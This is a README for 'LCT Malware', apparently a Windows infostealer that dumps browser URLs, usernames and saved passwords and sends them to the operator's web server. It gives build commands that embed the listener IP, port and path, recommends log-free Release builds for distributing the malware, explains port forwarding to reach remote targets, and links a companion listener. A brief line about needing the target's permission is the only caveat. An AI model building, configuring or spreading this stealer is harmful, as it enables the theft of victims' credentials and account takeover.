LCT Malware has ability to dump target's browsers URL, username and passwords then send to your web server.


Project Dependencies:
+ Win32 API
+ LibSodium
+ Sqlite3

All Dependencies has been specified in the folders, Dont play around with them :)

# Building On Windows

Requirements:
+ CMake
+ MinGW Compiler


Building the Malware in Windows is Really StraightForward, You Only need to execute those commands:
```
cmake -Bbuild -DHOSTNAME="{YourIP}" -DPORT=5656 -DPATH=/app -DBUILDTYPE="{BuildType}" -G "{Builder}"
```
Except {YourIP}, You should insert the listener IP<br/>
*Note: if the target is not in the local network , you should handle the "Port Forwarding" Operations*

Execpt {BuildType} You can put: MinSizeRel, Debug, Release, RelWithDebInfo<br/>
in `Debug` and `RelWithDebInfo`, you can see Log about the application workflow.
but in the other Build Types, there will be no Log ( So You should Use Release or MinSizeRel for Distributing Malware ).

Except {Builder} if you have Ninja you can simply put `Ninja`, or you can use MinGW Makefile by putting `MinGW Makefiles`.

After you configuer project with the command, You can use Ninja or MinGW Makefile to Build the Project.

Building with Ninja:
```
ninja -C build
```

Building with MinGW Makefile:
```
mingw32-make -C build
```

By the way this project was tested on Ninja Builder, and its faster, So its better option if you can use :)

# Building On Linux
**Note: Building on Linux, Does'nt mean that your project can run in Linux! the Target Of this Malware Can Only be Windows OS**

Requirements:
+ CMake
+ MinGW Cross Compiler

Building On linux is a bit complicated unlike Windows. 

First You need to install dependencies Using this command in Debian/Ubuntu Linux:
```
sudo apt-get install build-essential mingw-w64
```
This command was used to install cmake, and MinGW Cross Compilers.

Next You Should Configure the project with following Command:
```
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain.cmake -Bbuild -DHOSTNAME="{YourIP}"\
  -DPORT=5656 -DPATH=/app -DBUILDTYPE="{BuildType}" -G "{Builder}"
```

You need to Replace {YourIP}, {BuildType} and {Builder} same as the "Building On Linux" Chapter.

then for building with Ninja:
```
ninja -C build
```

And Building with MinGW Makefile:
```
make -C build
```

Have Fun with Your Malware :)<br/>
But hold on!! Before Using it, Make Sure You have the Permissions from te Target.

Also Feel free to modify PATH and PORT for your Custom Listener, This Configuration will work with [My Listener](https://github.com/iHapiW/LCT-Listener).
